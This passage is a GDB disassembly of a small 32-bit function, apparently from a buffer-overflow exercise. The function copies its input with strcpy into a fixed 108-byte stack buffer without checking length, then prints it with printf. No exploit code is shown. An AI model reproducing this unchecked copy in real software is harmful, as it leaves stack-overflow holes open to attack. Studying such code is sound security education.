   0x08048454 <+25>: mov    eax,DWORD PTR [eax]
   0x08048456 <+27>: sub    esp,0x8
   0x08048459 <+30>: push   eax
   0x0804845a <+31>: lea    eax,[ebp-0x6c]
   0x0804845d <+34>: push   eax
   0x0804845e <+35>: call   0x8048310 <strcpy@plt>
   0x08048463 <+40>: add    esp,0x10
   0x08048466 <+43>: sub    esp,0x8
   0x08048469 <+46>: lea    eax,[ebp-0x6c]
   0x0804846c <+49>: push   eax
   0x0804846d <+50>: push   0x8048510
   0x08048472 <+55>: call   0x8048300 <printf@plt>
   0x08048477 <+60>: add    esp,0x10
   0x0804847a <+63>: mov    eax,0x0
   0x0804847f <+68>: mov    ecx,DWORD PTR [ebp-0x4]
   0x08048482 <+71>: leave  
   0x08048483 <+72>: lea    esp,[ecx-0x4]
   0x08048486 <+75>: ret    
End of assembler dump.
```
